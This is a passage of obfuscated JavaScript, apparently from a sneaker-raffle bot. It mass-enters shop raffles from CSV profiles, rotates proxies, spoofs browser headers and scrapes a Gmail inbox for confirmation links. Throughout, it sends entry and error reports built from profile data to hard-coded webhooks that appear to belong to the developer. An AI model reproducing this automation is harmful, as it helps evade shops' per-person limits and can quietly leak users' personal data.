                                await _0x1aa0e8['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x1aa0e8['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Logging\x20in'), await _0x1aa0e8['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1aa0e8['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1aa0e8['waitForSelector']('#username'), await _0x1aa0e8['type']('#username', _0x30b11a[_0x4c40ca]['Email']), await _0x1aa0e8['waitForSelector']('#password'), await _0x1aa0e8['type']('#password', _0x30b11a[_0x4c40ca]['Password']), await _0x37731a(0x190), await _0x1aa0e8['click']('#buttonSubmit'), await _0x1aa0e8['waitForSelector']('div.b-user_greeting'), console['log'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Getting\x20Product'), await _0x37731a(0x1f4), await _0x1aa0e8['goto']('' + _0x30b11a[_0x4c40ca]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x30b11a[_0x4c40ca]['Size']);
                            let _0x2d1ff2 = _0x30b11a[_0x4c40ca]['Size']['replace']('.5', '\x201/2');
                            await _0x1aa0e8['click']('button[title=\x22' + _0x2d1ff2 + '\x22]'), await _0x37731a(0x1f4);
                            try {
                                await _0x1aa0e8['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x37731a(0x12c), console['log'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1aa0e8['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x37731a(0x12c), await _0x1aa0e8['type']('#dwfrm_raffle_addressFields_firstName', _0x30b11a[_0x4c40ca]['FirstName']), await _0x37731a(0x12c), await _0x1aa0e8['type']('#dwfrm_raffle_addressFields_lastName', _0x30b11a[_0x4c40ca]['LastName']), await _0x37731a(0x12c), await _0x1aa0e8['select']('#dwfrm_raffle_addressFields_country', _0x30b11a[_0x4c40ca]['Country']), await _0x37731a(0x12c), await _0x1aa0e8['type']('#dwfrm_raffle_addressFields_city', _0x30b11a[_0x4c40ca]['City']), await _0x37731a(0x12c);
                            _0x30b11a[_0x4c40ca]['Postcode'] == undefined && (_0x30b11a[_0x4c40ca]['Postcode'] = _0x30b11a[_0x4c40ca]['Zip']);
                            await _0x1aa0e8['type']('#dwfrm_raffle_addressFields_postalCode', _0x30b11a[_0x4c40ca]['Postcode']), await _0x37731a(0x12c), await _0x1aa0e8['type']('#dwfrm_raffle_addressFields_address1', _0x30b11a[_0x4c40ca]['Address1']), await _0x37731a(0x12c), await _0x1aa0e8['type']('#dwfrm_raffle_addressFields_address2', _0x30b11a[_0x4c40ca]['HouseNumber']), await _0x37731a(0x12c), await _0x1aa0e8['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x30b11a[_0x4c40ca]['Address2']), await _0x37731a(0x12c), await _0x1aa0e8['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x37731a(0x12c), await _0x1aa0e8['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x30b11a[_0x4c40ca]['Follower']), await _0x37731a(0x1f4), await _0x1aa0e8['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x37731a(0x1f4), console['log'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20' + _0x7ff36['blue']('Awaiting\x20Paypal\x20Payment')), await _0x1aa0e8['click']('.b-paypal_button');
                            try {
                                await _0x1aa0e8['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x53bc57 = 'no', _0x5879e0(_0x30b11a[_0x4c40ca], _0x43b12a), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x38bcb6['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x38bcb6['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0xd6338c, _0x38bcb6['succesPUBMSG']);
                            } catch (_0x33fc64) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x33fc64)), _0x396336 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x33fc64;
                                var _0x4a2f00 = await _0x5c5001(_0x30b11a[_0x4c40ca], _0x43b12a, 'dev', !![], _0x396336);
                                _0x38bcb6['errorDEV'] = { 'embeds': [_0x4a2f00] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x38bcb6['errorDEV']), await _0x4160b0(_0x3ce78e, _0x38bcb6['errorDEV']);
                            }
                        } catch (_0x3c0756) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20' + _0x3c0756)), _0x396336 = '' + _0x3c0756;
                            var _0x4a2f00 = await _0x5c5001(_0x30b11a[_0x4c40ca], _0x43b12a, 'dev', !![], _0x396336);
                            _0x38bcb6['errorDEV'] = { 'embeds': [_0x4a2f00] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x38bcb6['errorDEV']), await _0x4160b0(_0x3ce78e, _0x38bcb6['errorDEV']), _0x53bc57 = 'yes';
                        } finally {
                            _0x3cde6b && _0x3cde6b['close']();
                            if (_0x53bc57 == 'yes' && _0x1f688f != 0x5) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Retrying\x20(' + _0x1f688f + '\x20/\x205)')), _0x4c40ca = _0x4c40ca - 0x1, _0x1f688f = _0x1f688f + 0x1;
                                continue;
                            }
                            _0x53bc57 == 'yes' && _0x1f688f >= 0x5 && (_0x17fcb0(_0x30b11a[_0x4c40ca], _0x43b12a), _0x53bc57 = 'no', _0x1f688f = 0x0), console['log']('Waiting\x20for\x20' + _0x15bf3f['AfewDelay'] + '\x20ms'), await _0x37731a(_0x15bf3f['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x13191e, _0x50817d, _0x4c8b84) {
                    for (var _0x36ccaf = 0x0; _0x36ccaf < _0x50817d['length']; _0x36ccaf++) {
                        try {
                            await _0x412246(_0x50817d, _0x36ccaf);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4d8c99(_0x1d79ca, _0x3b0858, _0x4f2e54, _0x320f5d, _0x42ddf1) {
                            var _0x1bb085, _0x57fc07 = {}, _0x209776 = [], _0x568f17 = {}, _0x4d4c3c = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x56fed8 = Math['round'](Math['random']() * (_0x4d4c3c['length'] - 0x1));
                            !_0x320f5d && (_0x320f5d = {});
                            if (_0x3b0858 != 'ver') {
                                _0x57fa03(_0x4f2e54['name'] + '\x20Task\x20' + (_0x1d79ca + 0x1) + '\x20/\x20' + _0x320f5d['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c), await _0x412246(_0x320f5d, _0x1d79ca), _0x57fc07 = _0x4f2e54['data'], _0x57fc07['data']['attributes']['email'] = '' + _0x320f5d[_0x1d79ca]['Email'];
                                if (_0x320f5d[_0x1d79ca]['Size'] == 'RANDOM') {
                                }
                                _0x57fc07['data']['attributes']['properties']['$first_name'] = '' + _0x320f5d[_0x1d79ca]['FirstName'], _0x57fc07['data']['attributes']['properties']['$last_name'] = '' + _0x320f5d[_0x1d79ca]['LastName'], _0x57fc07['data']['attributes']['properties']['$address1'] = _0x320f5d[_0x1d79ca]['Address1'] + '\x20' + _0x320f5d[_0x1d79ca]['Address2'] + '\x20' + _0x320f5d[_0x1d79ca]['HouseNumber'], _0x57fc07['data']['attributes']['properties']['$zip'] = '' + _0x320f5d[_0x1d79ca]['Zip'], _0x57fc07['data']['attributes']['properties']['$city'] = '' + _0x320f5d[_0x1d79ca]['City'], _0x57fc07['data']['attributes']['properties']['$country'] = '' + _0x320f5d[_0x1d79ca]['Country'], _0x320f5d[_0x1d79ca]['Size'] == 'RANDOM' ? _0x57fc07['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4d4c3c[_0x56fed8] : _0x57fc07['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x320f5d[_0x1d79ca]['Size'], _0x57fc07['data']['attributes']['properties']['$phone_number'] = '' + _0x320f5d[_0x1d79ca]['Phone'], _0x57fc07['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x320f5d[_0x1d79ca]['Follower'];
                            }
                            if (_0x15bf3f['useRandomProxy'] = ![])
                                var _0x3f4b22 = _0x42ddf1[_0x1d79ca]['split'](':');
                            else
                                var _0x53c713 = Math['round'](Math['random']() * (_0x42ddf1['length'] - 0x1)), _0x3f4b22 = _0x42ddf1[_0x53c713]['split'](':');
                            var _0x5bc646 = {
                                'jar': _0x50eb26,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x4f2e54['url'],
                                'headers': _0x4f2e54['headers'],
                                'body': JSON['stringify'](_0x57fc07),
                                'proxy': 'http://' + _0x3f4b22[0x2] + ':' + _0x3f4b22[0x3] + '@' + _0x3f4b22[0x0] + ':' + _0x3f4b22[0x1]
                            };
                            return _0x3b0858 != 'ver' && (_0x5bc646['url'] = _0x4f2e54['url'], _0x5bc646['headers'] = _0x4f2e54['headers']), _0x3b0858 == 'ver' && (_0x5bc646['method'] = 'GET'), new Promise(function (_0xf575ce, _0x5cf62b) {
                                callback = async (_0x339d92, _0x20c50c, _0x507310) => {
                                    if (!_0x339d92 && _0x20c50c['statusCode'] == 0xca || !_0x339d92 && _0x20c50c['statusCode'] == 0xc8) {
                                        if (_0x3b0858 != 'ver') {
                                            var _0x436e2e = await _0x5c5001(_0x320f5d[_0x1d79ca], _0x4f2e54, 'dev', ![]), _0x376374 = await _0x5c5001(_0x320f5d[_0x1d79ca], _0x4f2e54, 'pub', ![]);
                                            const _0x1bdfc4 = {
                                                'succesDEVMSG': { 'embeds': [_0x436e2e] },
                                                'succesPUBMSG': { 'embeds': [_0x376374] }
                                            };
                                            if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                                                try {
                                                    await _0x4160b0(_0x15bf3f['webhook'], _0x1bdfc4['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x1bdfc4['succesDEVMSG']), await _0x37731a(0xc8);
                                            try {
                                                await _0x4160b0(_0xd6338c, _0x1bdfc4['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5879e0(_0x320f5d[_0x1d79ca], _0x4f2e54);
                                        }
                                        _0xf575ce(console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x4f2e54['name'] + ']\x20Task\x20' + (_0x1d79ca + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x3b0858 != 'ver') {
                                            var _0x49c6a5 = '' + _0x339d92, _0x5836c1 = await _0x5c5001(_0x320f5d[_0x1d79ca], _0x4f2e54, 'dev', !![], _0x49c6a5), _0x104e70 = {};
                                            _0x104e70['errorDEV'] = { 'embeds': [_0x5836c1] }, _0x17fcb0(_0x320f5d[_0x1d79ca], _0x4f2e54), _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x104e70['errorDEV']), await _0x4160b0(_0x3ce78e, _0x104e70['errorDEV']);
                                        }
                                        _0x5cf62b(console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x4f2e54['name'] + ']\x20Task\x20' + (_0x1d79ca + 0x1) + ':\x20' + _0x339d92)));
                                    }
                                };
                                try {
                                    _0x3b0858 != 'ver' && console['log'](_0x1c7496() + '\x20[' + _0x4f2e54['name'] + ']\x20Task\x20' + (_0x1d79ca + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x57fc07['data']['attributes']['email']), _0x5b6a7b(_0x5bc646, callback);
                                } catch (_0x26e62a) {
                                    console['log'](_0x1c7496() + '\x20Task\x20' + (_0x1d79ca + 0x1) + ':\x20' + _0x26e62a);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x4d8c99(_0x36ccaf, 'nor', _0x13191e, _0x50817d, _0x4c8b84), console['log'](_0x1c7496() + '\x20[' + _0x13191e['name'] + ']\x20Sleeping\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        } catch (_0x299bd4) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x92f877, _0xad678c, _0x42f46d) {
                    var _0x522920 = [], _0x2286fa = ![];
                    async function _0x5e3dd1() {
                        var _0x4258bc = new _0x3451ed({
                            'user': _0x15bf3f['masterMail'],
                            'password': _0x15bf3f['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5b536d(_0x5cab8b) {
                            _0x4258bc['openBox']('INBOX', ![], _0x5cab8b);
                        }
                        _0x4258bc['once']('ready', function () {
                            _0x5b536d(function (_0x479112, _0x57d55d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x479112)
                                    throw _0x479112;
                                _0x4258bc['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0xea4aa2, _0x13c0b) {
                                    if (!_0x13c0b || !_0x13c0b['length'])
                                        console['log'](_0x1c7496() + '\x20[' + _0x92f877['name'] + ']\x20No\x20mails\x20found'), _0x4258bc['end']();
                                    else {
                                        var _0x3bab7f = _0x4258bc['seq']['fetch'](_0x13c0b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3bab7f['on']('message', function (_0x5cd23a, _0x2d28aa) {
                                            var _0x5a69df = '(#' + _0x2d28aa + ')\x20';
                                            _0x5cd23a['on']('body', function (_0x3023b0, _0x449f52) {
                                                _0x34a37a(_0x3023b0, (_0x699ce4, _0x2c6e51) => {
                                                    var _0x50543e = _0x2c6e51['text']['split']('(')[0x1], _0x42626c = _0x50543e['split'](')')[0x0];
                                                    _0x522920['push'](_0x42626c);
                                                });
                                            }), _0x5cd23a['once']('end', function () {
                                            });
                                        }), _0x3bab7f['once']('error', function (_0x4b5b4c) {
                                            console['log']('Fetch\x20error:\x20' + _0x4b5b4c), _0x2286fa = !![];
                                        }), _0x3bab7f['once']('end', function () {
                                            _0x4258bc['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x4258bc['once']('error', function (_0x530f63) {
                            console['log'](_0x7ff36['red'](_0x530f63['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2286fa = !![];
                        }), _0x4258bc['once']('end', async function () {
                            _0x2286fa = !![];
                        }), _0x4258bc['connect']();
                    }
                    async function _0x54c338(_0x8ae619, _0x53a4bb, _0x3222db) {
                        for (var _0x969b88 = 0x0; _0x969b88 < _0x53a4bb['length']; _0x969b88++) {
                            async function _0x17760f(_0x331081, _0x131496, _0x5b6305, _0x4da316, _0x19021f) {
                                var _0x368b1b, _0x276242 = {}, _0x812e9e = [], _0x24f6f7 = {}, _0x434934 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0xcda1d9 = Math['round'](Math['random']() * (_0x434934['length'] - 0x1));
                                _0x4da316[_0x331081]['Size'] == 'RANDOM' && (_0x4da316[_0x331081]['Size'] = _0x434934[_0xcda1d9]);
                                !_0x4da316 && (_0x4da316 = {});
                                if (_0x15bf3f['useRandomProxy'] = ![])
                                    var _0x2ebe91 = _0x19021f[_0x331081]['split'](':');
                                else
                                    var _0xe81c84 = Math['round'](Math['random']() * (_0x19021f['length'] - 0x1)), _0x2ebe91 = _0x19021f[_0xe81c84]['split'](':');
                                var _0xbfe6c3 = {
                                    'jar': _0x50eb26,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5b6305['url'],
                                    'headers': _0x5b6305['headers'],
                                    'body': JSON['stringify'](_0x276242),
                                    'proxy': 'http://' + _0x2ebe91[0x2] + ':' + _0x2ebe91[0x3] + '@' + _0x2ebe91[0x0] + ':' + _0x2ebe91[0x1]
                                };
                                return _0x131496 != 'ver' && (_0xbfe6c3['url'] = _0x5b6305['url'], _0xbfe6c3['headers'] = _0x5b6305['headers']), _0x131496 == 'ver' && (_0xbfe6c3['method'] = 'GET', _0xbfe6c3['url'] = _0x4da316[_0x331081]), new Promise(function (_0x2baf4f, _0x4147e5) {
                                    callback = async (_0x12839c, _0x5d14ce, _0x4ff60d) => {
                                        if (!_0x12839c && _0x5d14ce['statusCode'] == 0xca || !_0x12839c && _0x5d14ce['statusCode'] == 0xc8) {
                                            if (_0x131496 != 'ver') {
                                                var _0x32b83f = await _0x5c5001(_0x4da316[_0x331081], _0x5b6305, 'dev', ![]), _0x22ffaa = await _0x5c5001(_0x4da316[_0x331081], _0x5b6305, 'pub', ![]);
                                                const _0x4ef1d6 = {
                                                    'succesDEVMSG': { 'embeds': [_0x32b83f] },
                                                    'succesPUBMSG': { 'embeds': [_0x22ffaa] }
                                                };
                                                if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                                                    try {
                                                        await _0x4160b0(_0x15bf3f['webhook'], _0x4ef1d6['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x4ef1d6['succesDEVMSG']), await _0x37731a(0xc8);
                                                try {
                                                    await _0x4160b0(_0xd6338c, _0x4ef1d6['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5879e0(_0x4da316[_0x331081], _0x5b6305);
                                            }
                                            _0x2baf4f(console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x5b6305['name'] + ']\x20Task\x20' + (_0x331081 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x131496 != 'ver') {
                                                var _0x598499 = '' + _0x12839c, _0x46950c = await _0x5c5001(_0x4da316[_0x331081], _0x5b6305, 'dev', !![], _0x598499), _0x489569 = {};
                                                _0x489569['errorDEV'] = { 'embeds': [_0x46950c] }, _0x17fcb0(_0x4da316[_0x331081], _0x5b6305), _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x489569['errorDEV']), await _0x4160b0(_0x3ce78e, _0x489569['errorDEV']);
                                            }
                                            _0x4147e5(console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x5b6305['name'] + ']\x20Task\x20' + (_0x331081 + 0x1) + ':\x20' + _0x12839c)));
                                        }
                                    };
                                    try {
                                        _0x131496 != 'ver' ? console['log'](_0x1c7496() + '\x20[' + _0x5b6305['name'] + ']\x20Task\x20' + (_0x331081 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x276242['data']['attributes']['email']) : console['log'](_0x1c7496() + '\x20[' + _0x5b6305['name'] + ']\x20Task\x20' + (_0x331081 + 0x1) + ':\x20Fetching\x20Response'), _0x5b6a7b(_0xbfe6c3, callback);
                                    } catch (_0x171284) {
                                        console['log'](_0x1c7496() + '\x20Task\x20' + (_0x331081 + 0x1) + ':\x20' + _0x171284);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x17760f(_0x969b88, 'ver', _0x8ae619, _0x53a4bb, _0x3222db), console['log'](_0x1c7496() + '\x20[' + _0x8ae619['name'] + ']\x20Sleeping\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                            } catch (_0x447885) {
                            }
                        }
                    }
                    try {
                        _0x5e3dd1();
                        while (!_0x2286fa) {
                            await _0x37731a(0xbb8);
                        }
                        console['log']('Found\x20' + _0x522920['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x37731a(0x9c4);
                    }
                    await _0x54c338(_0x92f877, _0x522920, _0x42f46d);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YAQ4Ja',
                            'custom_source': 'DN3707-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TntaQ5',
                                '$consent_form_version': 0x81b1d1,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1ae87b, _0x1a2a6e, _0x24db96) {
                    for (var _0x135fe5 = 0x0; _0x135fe5 < _0x1a2a6e['length']; _0x135fe5++) {
                        try {
                            await _0x412246(_0x1a2a6e, _0x135fe5);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0xcb12c2(_0x3ca995, _0x42d9e7, _0x5aca4b, _0x22be9c, _0x29f488) {
                            var _0x450769, _0x4e4e87 = {}, _0x2275ca = [], _0x33240d = {}, _0x3baa88 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x2aca6d = Math['round'](Math['random']() * (_0x3baa88['length'] - 0x1));
                            !_0x22be9c && (_0x22be9c = {});
                            if (_0x42d9e7 != 'ver') {
                                _0x57fa03(_0x5aca4b['name'] + '\x20Task\x20' + (_0x3ca995 + 0x1) + '\x20/\x20' + _0x22be9c['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c), _0x2275ca = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x6362be
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x22be9c[_0x3ca995]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x15bf3f['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x2bd99c
                                        }
                                    ]
                                }], _0x33240d = { 'embeds': _0x2275ca }, _0x4e4e87 = _0x5aca4b['data'], _0x4e4e87['data']['attributes']['email'] = '' + _0x22be9c[_0x3ca995]['Email'];
                                if (_0x22be9c[_0x3ca995]['Size'] == 'RANDOM') {
                                }
